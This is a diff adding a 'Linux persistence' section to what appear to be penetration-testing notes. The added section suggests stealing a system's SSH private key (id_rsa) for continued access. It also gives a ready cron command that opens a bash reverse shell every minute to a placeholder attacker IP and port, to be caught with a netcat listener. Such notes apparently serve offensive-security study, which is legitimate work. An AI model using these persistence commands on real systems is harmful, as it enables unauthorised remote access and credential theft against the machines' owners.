@@ -642,4 +642,28 @@ automated scan:
 
 Already there are many commands I Have written previously in the linux enumeration section.
 
-##
+## Linux persistence
+
+### through ssh
+
+Just copy the id_rsa from .ssh folder which is the private key for the system and you can login with it anytime and id_rsa is not present you create one with the help of ssh_keygen
+
+### through cron jobs
+
+We can create a reverse shell and have that cron job execute that reverse shell according to our time.
+run the following command
+
+```bash
+echo "* * * * * /bin/bash -c 'bash -i >& /dev/tcp/(attacker ip)/(attacker port) 0>&1'" > cron
+crontab -i cron
+```
+After this cron will set up and you can use the netcat listner to connect to it whenver you want
+
+
+
+
+
+
+
+
+
